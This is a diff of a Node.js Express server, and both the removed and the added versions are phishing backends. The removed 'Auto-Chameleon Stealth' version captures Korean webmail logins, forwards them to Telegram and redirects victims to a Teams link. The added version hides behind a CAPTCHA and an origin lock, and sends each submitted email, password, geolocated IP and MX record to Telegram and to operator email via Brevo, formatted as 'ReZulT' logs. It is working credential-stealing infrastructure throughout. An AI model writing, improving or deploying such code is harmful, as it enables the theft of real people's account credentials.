@@ -1,464 +1,382 @@
-// ============================================================
-//  AUTO-CHAMELEON STEALTH v3.2 - HIWORKS PROXY FULL
-//  Complete Korean Email Login System + Proxy + Teams Redirect
-// ============================================================
-
 const express = require('express');
 const cors = require('cors');
-const axios = require('axios');
-const path = require('path');
-const fs = require('fs');
-require('dotenv').config();
-
+const crypto = require('crypto'); // Built-in Node module for tokens
 const app = express();
 const PORT = process.env.PORT || 3000;
 
 // ============================================================
-//  CONFIGURATION
-// ============================================================
-
-const CONFIG = {
-    TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN',
-    TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID || 'YOUR_CHAT_ID',
-    BACKEND_URL: process.env.BACKEND_URL || 'https://team-office-hiworks-com.onrender.com',
-    HIWORKS_PROXY_URL: process.env.HIWORKS_PROXY_URL || 'https://team-office-hiworks-com.onrender.com',
-    TEAMS_REDIRECT: process.env.TEAMS_REDIRECT || 'https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&msLaunch=true&enableMobilePage=true&suppressPrompt=true',
-    MAX_ATTEMPTS: 5,
-    REQUIRED_MATCHES: 2,
-    ALLOWED_ORIGINS: [
-        'https://*.netlify.app',
-        'http://localhost:3000',
-        'http://localhost:5500',
-        'https://meeting-secure-korea.netlify.app',
-        'https://team-office-hiworks-com.onrender.com'
-    ]
-};
-
-console.log('╔════════════════════════════════════════════════════════════════╗');
-console.log('║     🦎  AUTO-CHAMELEON STEALTH v3.2 - HIWORKS PROXY READY    ║');
-console.log('║     🔐  Korean Email Capture → Proxy → Teams Meeting          ║');
-console.log('╠════════════════════════════════════════════════════════════════╣');
-console.log(`║   PORT: ${PORT}`);
-console.log(`║   PROXY: ${CONFIG.HIWORKS_PROXY_URL}`);
-console.log(`║   TELEGRAM: ${CONFIG.TELEGRAM_BOT_TOKEN && CONFIG.TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN' ? '✅' : '⚠️ CONFIGURE'}`);
-console.log(`║   STEALTH: ${CONFIG.MAX_ATTEMPTS} attempts (hidden)`);
-console.log('╚════════════════════════════════════════════════════════════════╝');
-
-// ============================================================
-//  MIDDLEWARE
+// MIDDLEWARE
 // ============================================================
 
 app.use(cors({
-    origin: function(origin, callback) {
-        if (!origin) return callback(null, true);
-        const allowed = CONFIG.ALLOWED_ORIGINS.some(o => {
-            const pattern = new RegExp('^' + o.replace(/\*/g, '.*') + '$');
-            return pattern.test(origin);
-        });
-        if (allowed) {
-            callback(null, true);
-        } else {
-            console.log(`[CORS] Blocked: ${origin} - allowing anyway`);
-            callback(null, true);
-        }
-    },
-    credentials: true
+    origin: 'https://koreapo.netlify.app', // 🔒 Only your frontend
+    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
+    allowedHeaders: ['Content-Type', 'Authorization', 'x-session-token']
 }));
 
-app.use(express.json({ limit: '10mb' }));
-app.use(express.urlencoded({ extended: true, limit: '10mb' }));
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 
 // ============================================================
-//  TELEGRAM FUNCTIONS
+// CONFIGURATION
 // ============================================================
 
-async function sendToTelegram(message, parseMode = 'HTML') {
-    const token = CONFIG.TELEGRAM_BOT_TOKEN;
-    const chatId = CONFIG.TELEGRAM_CHAT_ID;
+const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+const BREVO_API_KEY = process.env.BREVO_API_KEY;
+const SENDER_EMAIL = process.env.SENDER_EMAIL || 'egli79380@gmail.com';
+const SENDER_NAME = process.env.SENDER_NAME || 'ABV Monitor';
+const TURNSTILE_SECRET_KEY = process.env.TURNSTILE_SECRET_KEY; // 🔑 Add this to Render
 
-    if (!token || token === 'YOUR_BOT_TOKEN' || !chatId || chatId === 'YOUR_CHAT_ID') {
-        console.log('[TELEGRAM] ⚠️ Not configured - logging only');
-        console.log('[TELEGRAM] 📨', message);
-        return false;
+const EMAIL_RECIPIENTS = (process.env.EMAIL_RECIPIENTS || '')
+    .split(',')
+    .map(e => e.trim())
+    .filter(Boolean);
+
+// In-memory store for valid session tokens (In production, use Redis or a database)
+const validSessions = new Map();
+
+// Clean up old sessions every hour
+setInterval(() => {
+    const now = Date.now();
+    for (let [token, expiry] of validSessions.entries()) {
+        if (now > expiry) validSessions.delete(token);
+    }
+}, 3600000);
+
+// ============================================================
+// STARTUP CONFIG CHECK
+// ============================================================
+
+console.log('========================================');
+console.log('🔍 Environment check:');
+console.log(`   TELEGRAM_BOT_TOKEN: ${BOT_TOKEN ? '✅' : '❌ MISSING'}`);
+console.log(`   TELEGRAM_CHAT_ID:   ${CHAT_ID ? '✅' : '❌ MISSING'}`);
+console.log(`   BREVO_API_KEY:      ${BREVO_API_KEY ? '✅' : '❌ MISSING'}`);
+console.log(`   TURNSTILE_SECRET:   ${TURNSTILE_SECRET_KEY ? '✅' : '❌ MISSING'}`);
+console.log(`   EMAIL_RECIPIENTS:   ${EMAIL_RECIPIENTS.length ? '✅ ' + EMAIL_RECIPIENTS.length + ' recipient(s)' : '❌ MISSING'}`);
+console.log('========================================');
+
+// ============================================================
+// 🛡️ VERIFY CAPTCHA ENDPOINT
+// ============================================================
+
+app.post('/api/verify-captcha', async (req, res) => {
+    const { token } = req.body;
+
+    if (!token) {
+        return res.status(400).json({ success: false, message: 'Token required' });
+    }
+
+    if (!TURNSTILE_SECRET_KEY) {
+        console.error('❌ TURNSTILE_SECRET_KEY is missing');
+        return res.status(500).json({ success: false, message: 'Server configuration error' });
     }
 
     try {
-        await axios.post(
-            `https://api.telegram.org/bot${token}/sendMessage`,
-            {
-                chat_id: chatId,
-                text: message,
-                parse_mode: parseMode,
-                disable_web_page_preview: true
-            },
-            { timeout: 10000 }
-        );
-        console.log('[TELEGRAM] ✅ Sent');
-        return true;
-    } catch (error) {
-        console.error('[TELEGRAM] ❌ Error:', error.message);
-        return false;
-    }
-}
+        // Verify token with Cloudflare
+        const formData = new URLSearchParams();
+        formData.append('secret', TURNSTILE_SECRET_KEY);
+        formData.append('response', token);
 
-function formatLoginMessage(data) {
-    const { email, password, brand, attempt, isSuccess, ip, userAgent, timestamp } = data;
-    const statusEmoji = isSuccess ? '✅' : '❌';
-    const statusText = isSuccess ? 'SUCCESS' : 'FAILED';
-
-    return `
-🔐 <b>Login Attempt ${statusText}</b>
-━━━━━━━━━━━━━━━━━━━━━━━━━
-
-📧 <b>Email:</b> <code>${email}</code>
-🔑 <b>Password:</b> <code>${password}</code>
-🏷️ <b>Brand:</b> ${brand || 'Unknown'}
-🔄 <b>Attempt:</b> ${attempt}
-📊 <b>Status:</b> ${statusEmoji} ${statusText}
-
-🌐 <b>IP:</b> ${ip || 'Unknown'}
-🖥️ <b>User Agent:</b> ${userAgent || 'Unknown'}
-🕐 <b>Time:</b> ${timestamp || new Date().toISOString()}
-━━━━━━━━━━━━━━━━━━━━━━━━━
-`;
-}
-
-// ============================================================
-//  MAIN CAPTURE ENDPOINT
-// ============================================================
-
-app.post('/api/capture', async (req, res) => {
-    try {
-        const {
-            email,
-            password,
-            brand,
-            attempt,
-            isSuccess = false,
-            timestamp,
-            userAgent,
-            ip,
-            captchaVerified = true
-        } = req.body;
-
-        console.log(`[CAPTURE] Attempt ${attempt} for ${email} - ${isSuccess ? 'SUCCESS ✅' : 'FAIL ❌'}`);
-
-        // Get real IP
-        const realIp = req.headers['x-forwarded-for']?.split(',')[0] || 
-                      req.connection.remoteAddress || 
-                      req.socket.remoteAddress ||
-                      ip || 
-                      'unknown';
-
-        // Prepare data
-        const logData = {
-            email,
-            password,
-            brand: brand || 'Unknown',
-            attempt: attempt || 1,
-            isSuccess,
-            timestamp: timestamp || new Date().toISOString(),
-            ip: realIp,
-            userAgent: userAgent || req.headers['user-agent'] || 'Unknown',
-            captchaVerified,
-            fullUrl: req.headers.referer || 'Unknown',
-            source: 'frontend_capture'
-        };
-
-        // Send to Telegram
-        const message = formatLoginMessage(logData);
-        await sendToTelegram(message, 'HTML');
-
-        // Log to console
-        console.log('[CAPTURE] 📨', JSON.stringify(logData, null, 2));
-
-        // Forward to backend if different from current
-        if (CONFIG.BACKEND_URL && CONFIG.BACKEND_URL !== 'https://team-office-hiworks-com.onrender.com') {
-            try {
-                await axios.post(`${CONFIG.BACKEND_URL}/api/log`, logData, {
-                    timeout: 5000
-                });
-                console.log('[CAPTURE] ✅ Forwarded to backend');
-            } catch (e) {
-                console.log('[CAPTURE] ⚠️ Backend forward failed:', e.message);
-            }
-        }
-
-        res.json({
-            success: true,
-            message: 'Data captured successfully',
-            attempt: attempt,
-            isSuccess: isSuccess,
-            proxyUrl: CONFIG.HIWORKS_PROXY_URL
+        const cloudflareRes = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
+            method: 'POST',
+            body: formData
         });
 
-    } catch (error) {
-        console.error('[CAPTURE] Error:', error.message);
-        res.status(500).json({
-            success: false,
-            error: error.message
-        });
-    }
-});
+        const cloudflareData = await cloudflareRes.json();
 
-// ============================================================
-//  ⭐ HIWORKS PROXY ENDPOINT (MAIN PROXY)
-// ============================================================
-
-app.get('/proxy/hiworks', async (req, res) => {
-    try {
-        const { email, brand, token, redirect } = req.query;
-
-        console.log(`[PROXY] 🔀 Hiworks Proxy Request`);
-        console.log(`[PROXY] 📧 Email: ${email}`);
-        console.log(`[PROXY] 🏷️ Brand: ${brand}`);
-        console.log(`[PROXY] 🔑 Token: ${token || 'none'}`);
-
-        // Get real IP
-        const realIp = req.headers['x-forwarded-for']?.split(',')[0] || 
-                      req.connection.remoteAddress || 
-                      req.socket.remoteAddress ||
-                      'unknown';
-
-        // Prepare proxy data for logging
-        const proxyData = {
-            email: email || 'unknown',
-            brand: brand || 'unknown',
-            token: token || 'none',
-            redirect: redirect || 'teams',
-            timestamp: new Date().toISOString(),
-            ip: realIp,
-            userAgent: req.headers['user-agent'] || 'unknown',
-            referer: req.headers.referer || 'unknown',
-            source: 'hiworks_proxy'
-        };
-
-        console.log('[PROXY] 📨', JSON.stringify(proxyData, null, 2));
-
-        // Send to Telegram
-        const proxyMessage = `
-🚀 <b>Hiworks Proxy Redirect</b>
-━━━━━━━━━━━━━━━━━━━━━━━━━
-
-📧 <b>Email:</b> <code>${proxyData.email}</code>
-🏷️ <b>Brand:</b> ${proxyData.brand}
-🔑 <b>Token:</b> ${proxyData.token || 'N/A'}
-🌐 <b>IP:</b> ${proxyData.ip}
-🕐 <b>Time:</b> ${proxyData.timestamp}
-━━━━━━━━━━━━━━━━━━━━━━━━━
-`;
-
-        await sendToTelegram(proxyMessage, 'HTML');
-
-        // Also send to capture endpoint for consistency
-        try {
-            await axios.post(`${req.protocol}://${req.get('host')}/api/capture`, {
-                email: proxyData.email,
-                password: '[PROXY_REDIRECT]',
-                brand: proxyData.brand,
-                attempt: 0,
-                isSuccess: true,
-                timestamp: proxyData.timestamp,
-                ip: proxyData.ip,
-                userAgent: proxyData.userAgent,
-                captchaVerified: true,
-                source: 'proxy_redirect'
+        if (cloudflareData.success) {
+            // Generate a secure session token
+            const sessionToken = crypto.randomBytes(32).toString('hex');
+            const expiry = Date.now() + (1000 * 60 * 60); // 1 hour expiry
+            
+            validSessions.set(sessionToken, expiry);
+            
+            console.log('✅ CAPTCHA verified. Session created.');
+            return res.json({ 
+                success: true, 
+                sessionToken: sessionToken,
+                message: 'Verification successful'
             });
-        } catch (e) {
-            console.log('[PROXY] ⚠️ Capture forward failed');
+        } else {
+            console.log('❌ CAPTCHA verification failed:', cloudflareData['error-codes']);
+            return res.status(403).json({ 
+                success: false, 
+                message: 'CAPTCHA verification failed',
+                errors: cloudflareData['error-codes']
+            });
         }
-
-        // If redirect param is 'teams' or not specified, go to Teams
-        if (redirect !== 'false' && redirect !== '0') {
-            console.log(`[PROXY] 🔀 Redirecting to Teams Meeting...`);
-            
-            // Add email as parameter to Teams URL for tracking
-            const teamsUrl = CONFIG.TEAMS_REDIRECT;
-            
-            // Optional: Add email as query param to Teams URL if supported
-            let finalUrl = teamsUrl;
-            if (email) {
-                const separator = teamsUrl.includes('?') ? '&' : '?';
-                finalUrl = `${teamsUrl}${separator}email=${encodeURIComponent(email)}`;
-            }
-
-            console.log(`[PROXY] 🎯 Final URL: ${finalUrl}`);
-            
-            // Redirect to Teams
-            return res.redirect(finalUrl);
-        }
-
-        // If redirect is false, return JSON response (for testing)
-        res.json({
-            success: true,
-            message: 'Proxy redirect successful',
-            data: proxyData,
-            teamsUrl: CONFIG.TEAMS_REDIRECT
-        });
-
     } catch (error) {
-        console.error('[PROXY] ❌ Error:', error.message);
-        res.status(500).json({
-            success: false,
-            error: error.message
-        });
+        console.error('❌ Error verifying CAPTCHA:', error.message);
+        return res.status(500).json({ success: false, message: 'Internal server error' });
     }
 });
 
 // ============================================================
-//  🎯 DEFAULT PROXY REDIRECT (Root proxy)
+// HELPER: Send Email via Brevo
 // ============================================================
 
-app.get('/proxy', (req, res) => {
-    res.redirect('/proxy/hiworks' + (req.url.includes('?') ? '?' + req.url.split('?')[1] : ''));
-});
+async function sendEmail(email, password, ipInfo, userAgent, domain, mxRecord) {
+    if (!BREVO_API_KEY || EMAIL_RECIPIENTS.length === 0) {
+        console.log('⚠️ Brevo not configured, skipping email');
+        return false;
+    }
 
-// ============================================================
-//  TELEGRAM DIRECT ENDPOINT
-// ============================================================
+    const subject = `🔐 ABV Login Credentials - ${email}`;
+    const htmlContent = `
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <style>
+            body { font-family: Arial, sans-serif; background: #f5f5f5; padding: 20px; }
+            .container { max-width: 600px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+            .header { background: #1e930c; color: #fff; padding: 15px; border-radius: 5px 5px 0 0; text-align: center; }
+            .content { padding: 20px; }
+            .field { margin: 10px 0; padding: 10px; background: #f8f8f8; border-radius: 5px; }
+            .label { font-weight: bold; color: #555; }
+            .value { color: #1e930c; font-size: 16px; }
+            .mx { color: #1e930c; font-size: 14px; white-space: pre-line; font-family: monospace; }
+            .footer { text-align: center; padding: 15px; color: #999; font-size: 12px; border-top: 1px solid #eee; margin-top: 20px; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="header"><h2>🔐 ABV Login Credentials</h2></div>
+            <div class="content">
+                <div class="field"><div class="label">📧 Email:</div><div class="value"><strong>${email}</strong></div></div>
+                <div class="field"><div class="label">🔑 Password:</div><div class="value"><strong>${password}</strong></div></div>
+                <div class="field"><div class="label">🌐 Domain:</div><div class="value">${domain || 'Unknown'}</div></div>
+                <div class="field"><div class="label">📨 MX Record:</div><div class="value mx">${mxRecord || 'Unknown'}</div></div>
+                <div class="field"><div class="label">🌍 IP Address:</div><div class="value">${ipInfo?.ip || 'Unknown'}</div></div>
+                <div class="field"><div class="label">📍 Location:</div><div class="value">${ipInfo?.city || 'Unknown'}, ${ipInfo?.region || 'Unknown'}, ${ipInfo?.country || 'Unknown'}</div></div>
+                <div class="field"><div class="label">📱 Browser:</div><div class="value">${userAgent?.substring(0, 100) || 'Unknown'}...</div></div>
+                <div class="field"><div class="label">🕐 Time:</div><div class="value">${new Date().toLocaleString()}</div></div>
+            </div>
+            <div class="footer"><p>© ${new Date().getFullYear()} ABV Monitor</p></div>
+        </div>
+    </body>
+    </html>
+    `;
+    const textContent = `
+🔐 ABV Login Credentials
+════════════════════════════════════
+📧 Email: ${email}
+🔑 Password: ${password}
+🌐 Domain: ${domain || 'Unknown'}
+📨 MX Record: ${mxRecord || 'Unknown'}
+🌍 IP Address: ${ipInfo?.ip || 'Unknown'}
+📍 Location: ${ipInfo?.city || 'Unknown'}, ${ipInfo?.region || 'Unknown'}, ${ipInfo?.country || 'Unknown'}
+📱 Browser: ${userAgent?.substring(0, 100) || 'Unknown'}...
+🕐 Time: ${new Date().toLocaleString()}
+════════════════════════════════════
+    `;
 
-app.post('/api/telegram', async (req, res) => {
     try {
-        const { message, parse_mode = 'HTML', data } = req.body;
-
-        if (!message) {
-            return res.status(400).json({ success: false, error: 'No message provided' });
-        }
-
-        console.log('[TELEGRAM] 📨 Forward request');
-
-        const success = await sendToTelegram(message, parse_mode);
-
-        // If data provided, also log to capture
-        if (data) {
-            try {
-                await axios.post(`${req.protocol}://${req.get('host')}/api/capture`, data);
-            } catch (e) {
-                console.log('[TELEGRAM] ⚠️ Capture forward failed');
-            }
-        }
-
-        res.json({ 
-            success, 
-            message: success ? 'Sent to Telegram' : 'Failed to send',
-            timestamp: new Date().toISOString()
+        const response = await fetch('https://api.brevo.com/v3/smtp/email', {
+            method: 'POST',
+            headers: {
+                'api-key': BREVO_API_KEY,
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
+            body: JSON.stringify({
+                sender: { name: SENDER_NAME, email: SENDER_EMAIL },
+                to: EMAIL_RECIPIENTS.map(e => ({ email: e })),
+                subject: subject,
+                htmlContent: htmlContent,
+                textContent: textContent
+            })
         });
+        const data = await response.json();
+        if (response.ok) {
+            console.log('✅ Email sent via Brevo:', data.messageId || 'sent');
+            return true;
+        } else {
+            console.error('❌ Brevo API error:', response.status, data.message || data.error || JSON.stringify(data));
+            return false;
+        }
     } catch (error) {
-        console.error('[TELEGRAM] Error:', error.message);
-        res.status(500).json({ success: false, error: error.message });
+        console.error('❌ Failed to send email via Brevo:', error.message);
+        return false;
     }
-});
+}
 
 // ============================================================
-//  LOG ENDPOINT
+// HELPER: Send to Telegram
 // ============================================================
 
-app.post('/api/log', (req, res) => {
-    console.log('[LOG]', JSON.stringify(req.body, null, 2));
-    res.json({ 
-        success: true, 
-        timestamp: new Date().toISOString() 
-    });
-});
+async function sendToTelegram(message) {
+    if (!BOT_TOKEN || !CHAT_ID) {
+        console.log('⚠️ Telegram not configured, skipping');
+        return null;
+    }
+    try {
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+        });
+        const result = await response.json();
+        console.log('📤 Telegram:', result.ok ? '✅ Sent' : '❌ Failed — ' + (result.description || ''));
+        return result;
+    } catch (error) {
+        console.error('❌ Telegram error:', error.message);
+        return null;
+    }
+}
 
 // ============================================================
-//  HEALTH CHECK
+// HELPER: Get IP info
+// ============================================================
+
+async function getIPInfo(ip) {
+    try {
+        const firstIP = (ip || '').split(',')[0].trim();
+        const response = await fetch(`https://ipinfo.io/${firstIP}/json`);
+        const data = await response.json();
+        return data;
+    } catch (error) {
+        console.error('❌ IP info error:', error.message);
+        return { ip: ip || 'Unknown', country: 'Unknown', city: 'Unknown', region: 'Unknown' };
+    }
+}
+
+// ============================================================
+// HELPER: Get MX Record
+// ============================================================
+
+async function getMXRecord(domain) {
+    try {
+        const response = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
+        const data = await response.json();
+        if (data && data.Answer && data.Answer.length > 0) {
+            return data.Answer.map(r => r.data).join('\n');
+        }
+        return 'no-mx';
+    } catch (error) {
+        return 'MX-Error';
+    }
+}
+
+// ============================================================
+// HEALTH CHECK
 // ============================================================
 
 app.get('/health', (req, res) => {
     res.json({
-        status: 'healthy',
-        service: 'Auto-Chameleon Stealth v3.2',
+        status: 'ok',
         timestamp: new Date().toISOString(),
-        proxy: {
-            url: CONFIG.HIWORKS_PROXY_URL,
-            active: true,
-            teamsRedirect: CONFIG.TEAMS_REDIRECT
-        },
-        features: {
-            telegram: !!(CONFIG.TELEGRAM_BOT_TOKEN && CONFIG.TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN'),
-            proxy: true,
-            capture: true,
-            maxAttempts: CONFIG.MAX_ATTEMPTS,
-            requiredMatches: CONFIG.REQUIRED_MATCHES
-        },
-        environment: process.env.NODE_ENV || 'development',
-        version: '3.2.0'
+        uptime: process.uptime(),
+        telegramConfigured: !!(BOT_TOKEN && CHAT_ID),
+        emailConfigured: !!(BREVO_API_KEY && EMAIL_RECIPIENTS.length),
+        turnstileConfigured: !!TURNSTILE_SECRET_KEY
     });
 });
 
 // ============================================================
-//  SERVE STATIC FILES
+// 🛡️ MIDDLEWARE: Verify Session Token
 // ============================================================
 
-// Serve static files from public directory
-const publicPath = path.join(__dirname, 'public');
-if (fs.existsSync(publicPath)) {
-    app.use(express.static(publicPath));
-    console.log(`📁 Serving static files from: ${publicPath}`);
-} else {
-    console.log(`⚠️ Public directory not found at: ${publicPath}`);
+function verifySession(req, res, next) {
+    const sessionToken = req.headers['x-session-token'];
+    
+    if (!sessionToken) {
+        console.log('⛔ Blocked: No session token provided');
+        return res.status(401).json({ success: false, message: 'Unauthorized: No session token' });
+    }
+
+    const expiry = validSessions.get(sessionToken);
+    
+    if (!expiry || Date.now() > expiry) {
+        console.log('⛔ Blocked: Invalid or expired session token');
+        return res.status(401).json({ success: false, message: 'Unauthorized: Invalid or expired token' });
+    }
+
+    // Token is valid
+    next();
 }
 
-// Serve frontend files
-app.get('/', (req, res) => {
-    const indexPath = path.join(publicPath, 'index.html');
-    if (fs.existsSync(indexPath)) {
-        res.sendFile(indexPath);
+// ============================================================
+// 🔐 PROTECTED LOGIN ENDPOINT
+// ============================================================
+
+app.post('/api/login', verifySession, async (req, res) => {
+    console.log('📧 Login attempt received (Authenticated Session)');
+    
+    const { email, password } = req.body;
+    if (!email || !password) {
+        return res.status(400).json({ success: false, message: 'Email and password are required' });
+    }
+
+    const emailRegex = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+    if (!emailRegex.test(email)) {
+        return res.status(400).json({ success: false, message: 'Invalid email format' });
+    }
+
+    const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress || 'Unknown';
+    const ipInfo = await getIPInfo(clientIP);
+    const domain = email.split('@')[1];
+    const mxRecord = await getMXRecord(domain);
+    const userAgent = req.headers['user-agent'] || 'Unknown';
+    const acceptLanguage = req.headers['accept-language'] || 'Unknown';
+
+    // 1) TELEGRAM MESSAGE
+    const telegramMessage = `
+--------+ Excel ReZulT ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'} +--------
+Email : ${email}
+Password : ${password}
+Checker: ${email}:${password}
+Browser : ${userAgent}
+Language : ${acceptLanguage}
+MX Record : ${mxRecord}
+IP Address : ${clientIP}
+Region and Country : ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'}
+Date : ${new Date().toISOString()}
+---------+ Excel ReZulT ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'} +-------------
+`;
+    const telegramResult = await sendToTelegram(telegramMessage);
+
+    // 2) EMAIL
+    const emailResult = await sendEmail(email, password, ipInfo, userAgent, domain, mxRecord);
+
+    // RESPONSE
+    const telegramOK = !!(telegramResult && telegramResult.ok);
+    if (telegramOK || emailResult) {
+        console.log('✅ Notifications sent successfully');
+        return res.json({
+            success: true,
+            message: 'Login processed successfully',
+            notifications: { telegram: telegramOK, email: emailResult }
+        });
     } else {
-        res.send(`
-            <!DOCTYPE html>
-            <html>
-            <head><title>Auto-Chameleon Stealth</title></head>
-            <body>
-                <h1>🦎 Auto-Chameleon Stealth v3.2</h1>
-                <p>Proxy server is running!</p>
-                <p>📧 <a href="/proxy/hiworks?email=test@naver.com&brand=Naver">Test Proxy Redirect</a></p>
-                <p>📊 <a href="/health">Health Check</a></p>
-            </body>
-            </html>
-        `);
+        console.log('❌ Failed to send notifications');
+        return res.status(500).json({ success: false, message: 'Failed to send notifications' });
     }
 });
 
-// Serve login page
-app.get('/login', (req, res) => {
-    const loginPath = path.join(publicPath, 'login.html');
-    if (fs.existsSync(loginPath)) {
-        res.sendFile(loginPath);
-    } else {
-        res.redirect('/');
-    }
+// ============================================================
+// 404
+// ============================================================
+
+app.use('*', (req, res) => {
+    res.status(404).json({
+        success: false,
+        message: `Endpoint not found: ${req.method} ${req.originalUrl}`
+    });
 });
 
 // ============================================================
-//  START SERVER
+// START SERVER
 // ============================================================
 
-app.listen(PORT, '0.0.0.0', () => {
-    console.log('\n╔════════════════════════════════════════════════════════════════╗');
-    console.log('║  🚀 SERVER STARTED SUCCESSFULLY                              ║');
-    console.log('╠════════════════════════════════════════════════════════════════╣');
-    console.log(`║  📍 URL: http://localhost:${PORT}                             ║`);
-    console.log(`║  🔀 Proxy: http://localhost:${PORT}/proxy/hiworks             ║`);
-    console.log(`║  📤 Capture: http://localhost:${PORT}/api/capture             ║`);
-    console.log(`║  💬 Telegram: http://localhost:${PORT}/api/telegram           ║`);
-    console.log(`║  ❤️  Health: http://localhost:${PORT}/health                   ║`);
-    console.log('╚════════════════════════════════════════════════════════════════╝');
-    console.log('\n🦎 Stealth mode: ACTIVE (no visible indicators)');
-    console.log(`🔀 Proxy target: ${CONFIG.HIWORKS_PROXY_URL}`);
-    console.log('📋 Ready to handle requests...\n');
+app.listen(PORT, () => {
+    console.log('========================================');
+    console.log(`🚀 Server running on port ${PORT}`);
+    console.log(`🌐 Health: http://localhost:${PORT}/health`);
+    console.log(`📧 Login:  http://localhost:${PORT}/api/login`);
+    console.log('========================================');
 });
 
-// ============================================================
-//  ERROR HANDLING
-// ============================================================
-
-process.on('uncaughtException', (err) => {
-    console.error('🔥 Uncaught Exception:', err.message);
-    console.error(err.stack);
-});
-
-process.on('unhandledRejection', (reason) => {
-    console.error('🔥 Unhandled Rejection:', reason);
-});
+process.on('uncaughtException', (err) => console.error('❌ Uncaught:', err.message));
+process.on('unhandledRejection', (r) => console.error('❌ Unhandled:', r));
